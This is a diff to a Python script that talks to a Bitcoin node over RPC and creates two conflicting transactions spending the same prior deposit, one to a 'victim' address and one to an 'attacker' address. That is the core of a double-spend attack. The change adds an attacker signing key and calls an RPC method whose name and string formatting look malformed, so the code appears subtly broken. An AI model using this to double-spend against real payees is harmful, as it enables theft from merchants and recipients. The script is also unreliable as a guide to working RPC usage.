@@ -177,6 +177,7 @@ rpc_host = args.node_host
 rpc_port = args.node_port
 username = args.username
 password = args.password
+key = args.attacker_signkey
 victim_address   = args.victim_address
 attacker_address = args.attacker_address
 prev_txid  = args.prev_deposit_TXID
@@ -187,13 +188,15 @@ rpc_node = AuthServiceProxy(f"http://{username}:{password}@{rpc_host}:{rpc_port}
 print(rpc_node.getblockchaininfo())
 print()
 amount_btc = str(amount_btc)
-print(f"[\"txid\":\"{prev_txid}\",\"vout\":0] [\"{victim_address}\":{amount_btc}]")
-tx_V1 = "[{\"txid\":\"" + prev_txid + "\",\"vout\":0}]" "[{\"" + victim_address + "\":"   + amount_btc + "}]"
-tx_V2 = "[{\"txid\":\"" + prev_txid + "\",\"vout\":0}]" "[{\"" + attacker_address + "\":" + amount_btc + "}]"
+
+tx_V1 = '[{"txid":"'+ prev_txid +'", "vout":0}]' '{"'+ victim_address + '":'+ amount_btc + '}'
+tx_V2 = '[{"txid":"'+ prev_txid +'", "vout":0}]' '{"'+ attacker_address + '":'+ amount_btc + '}'
 print(tx_V1)
 print(tx_V2)
-tx_victim   = rpc_node.createrawtransaction(tx_V1)
-tx_attacker = rpc_node.createrawtransaction(tx_V2)
+tx_victim   = rpc_node.createrawtransactionwithkey(f"{tx_V1} \"[\"{key}\"]\"")
+tx_attacker = rpc_node.createrawtransactionwithkey(f"{tx_V2} \"[\"{key}\"]\"")
+print(tx_victim)
+print(type(tx_victim))
 print("--------------------")
 print(f"Victim   : {victim_address}")
 print(f"Attacker : {attacker_address}")
